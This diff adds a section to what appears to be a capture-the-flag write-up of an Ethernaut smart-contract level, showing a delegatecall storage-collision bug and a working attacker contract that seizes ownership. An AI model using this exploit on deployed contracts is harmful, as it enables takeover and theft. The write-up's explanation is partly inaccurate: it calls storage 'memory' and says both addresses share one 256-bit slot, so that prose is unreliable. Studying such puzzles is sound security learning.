@@ -658,3 +658,73 @@ So, for us to complete this level, we must first assign ourselves an allowance o
 contract.approve(player, "1000000000000000000000000")
 contract.transferFrom(player, contract.address, "1000000000000000000000000")
 ```
+
+# Level 16: Preservation
+```
+contract Preservation {
+    // public library contracts
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+    uint256 storedTime;
+    // Sets the function signature for delegatecall
+    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
+        timeZone1Library = _timeZone1LibraryAddress;
+        timeZone2Library = _timeZone2LibraryAddress;
+        owner = msg.sender;
+    }
+
+    // set the time for timezone 1
+    function setFirstTime(uint256 _timeStamp) public {
+        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+
+    // set the time for timezone 2
+    function setSecondTime(uint256 _timeStamp) public {
+        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+    // stores a timestamp
+    uint256 storedTime;
+
+    function setTime(uint256 _time) public {
+        storedTime = _time;
+    }
+}
+```
+
+The goal here is to take ownership of the contract. This is an interesting one: there is a bug in this implementation that could break all sorts of things, but we can use it to take ownership.
+
+When `delegatecall` is used, the code of another contract is executed with the memory of the first contract. However, this memory is just binary data, and different contracts might view it differently. When we call `setTime` using their simple `LibraryContract` implementation, this updates the field `storedTime`, which is of type `uint256` and is the *only* field this contract has. When this is called via `delegatecall`, `storeTime` in `LibraryContract`'s context is just the first 256 bits in the contract's memory, which in fact maps over the fields `timeZone1Library` and `timeZone2Library`, which take up 160 bits each (because they are the first two fields).
+
+So, if we call `setFirstTime` or `setSecondTime`, and we encode the address of our own contract into the right part of a `uint256` such that it overwrites `timeZone1Library`, then the next time we call `setFirstTime`, the parent contract will `delegatecall` to code that we control, and we will be able to do whatever we want. We will just need to make sure that we have a method that will be callable with the same method ID as `setTime`, so we will give it the same signature.
+
+I implemented the following contract. Note the two state parameters `rubbishData1` and `rubbishData2`. These are there so that when we write to `owner`, it is mapped to the same part of memory as the victim contract `Preservation`'s variable `owner`. Deploying this contract and calling `attack` completed this level.
+```
+contract TimeWarp {
+    address public rubbishData1;
+    address public rubbishData2;
+    address public owner;
+
+    function attack(address victim) external {
+        // make this contract the timeZone1Library
+        Preservation(victim).setFirstTime(uint256(uint160(address(this))));
+        // make the victim delegateCall back to this contract
+        Preservation(victim).setFirstTime(uint256(uint160(msg.sender)));
+    }
+
+    // this method pretends to be 'setTime', but actually changes the owner.
+    function setTime(uint256 _time) public {
+        owner = address(uint160(_time));
+    }
+}
+
+interface Preservation {
+  function setFirstTime ( uint256 _timeStamp ) external;
+}
+```
